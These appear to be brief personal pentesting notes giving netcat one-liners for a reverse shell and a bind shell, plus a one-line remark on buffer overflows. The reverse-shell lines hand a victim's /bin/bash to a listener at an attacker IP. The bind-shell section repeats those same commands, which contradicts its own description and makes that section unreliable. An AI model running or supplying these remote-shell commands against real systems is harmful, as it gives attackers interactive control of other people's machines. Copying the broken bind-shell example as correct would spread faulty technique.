# Reverse shell
Connection from the target to the attacker
//opening port with netcat on my system
nc -nvlp 4444

//establishing connection on the victims system
nc 192.168.0.6 4444 -e /bin/bash

# Bind shell
Connection from the attacker to the target  
//opening port with netcat on the target 
nc -nvlp 4444

//establishing connection on my pc
nc 192.168.0.6 4444 -e /bin/bash

# Buffer overflow
Local bo is not intereseting check for remote bo